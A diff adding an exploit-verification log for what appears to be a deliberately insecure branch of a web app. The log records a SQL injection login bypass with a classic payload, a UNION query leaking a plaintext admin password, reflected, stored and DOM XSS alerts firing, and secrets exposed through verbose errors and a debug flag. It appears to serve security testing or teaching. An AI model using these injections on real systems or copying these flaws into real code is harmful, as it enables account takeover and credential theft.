@@ -1,0 +1,21 @@
+=============================================================
+ INSECURE BRANCH — consolidated exploit verification (HEAD)
+=============================================================
+
+[#1 SQLi] login bypass  admin' OR '1'='1 :
+   POST /login -> HTTP 302 (302=in)
+   identity via injected session: Hi, admin
+   [#1 SQLi] search UNION leaks credentials (now PLAINTEXT): CorrectHorse9
+
+[#2 Reflected XSS] /search?q=<script>… :
+   ALERT FIRED with message: "localhost"
+
+[#3 Stored XSS] comment posted through the UI, fires for next viewer:
+   ALERT FIRED with message: "stored"
+
+[#4 DOM XSS] client innerHTML sink:
+   alert fired: YES "dom"
+
+[#5 SDE] plaintext + verbose error + hardcoded secret + debug dump:
+   verbose SQL error leak: SqliteError: near "x": syntax error
+   ?debug=true leaks plaintext admin password: "password":"CorrectHorse9"
